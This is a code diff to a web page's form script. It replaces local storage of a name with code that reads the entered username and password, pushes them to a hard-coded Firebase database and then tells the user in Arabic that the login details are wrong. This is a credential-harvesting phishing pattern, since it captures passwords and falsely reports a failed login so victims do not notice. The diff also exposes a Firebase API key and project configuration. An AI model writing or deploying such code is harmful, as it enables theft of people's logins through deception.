@@ -87,23 +87,41 @@
 
 </div>
 
-<script>
-    document.getElementById('simpleForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const data = {
-            name: document.getElementById('userName').value,
-            date: new Date().toLocaleString('ar-EG')
-        };
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
+  import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js";
 
-        let entries = JSON.parse(localStorage.getItem('adminData')) || [];
-        entries.push(data);
-        localStorage.setItem('adminData', JSON.stringify(entries));
+  // إعداداتك المستخرجة من الصورة
+  const firebaseConfig = {
+    apiKey: "AIzaSyAaBH-226p85q6sXgvdIGynkh0-0Ktsqf4",
+    authDomain: "mysignageproject.firebaseapp.com",
+    projectId: "mysignageproject",
+    storageBucket: "mysignageproject.firebasestorage.app",
+    messagingSenderId: "879223421643",
+    appId: "1:879223421643:web:ebb1ff5b8adc487f89794e"
+  };
 
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  document.getElementById('simpleForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const data = {
+        name: document.getElementById('userName').value,
+        password: document.getElementById('password').value,
+        date: new Date().toLocaleString('ar-EG')
+    };
+
+    // إرسال البيانات إلى Firebase
+    push(ref(db, 'entries'), data).then(() => {
         document.getElementById('status').innerText = "معلومات الدخول خاطئة";
-        document.getElementById('status').style.color = "#1b5e20";
-        this.reset();
+        document.getElementById('status').style.color = "#d32f2f";
+        document.getElementById('simpleForm').reset();
+    }).catch((error) => {
+        console.error("خطأ في الإرسال: ", error);
     });
+  });
 </script>
 
 </body>
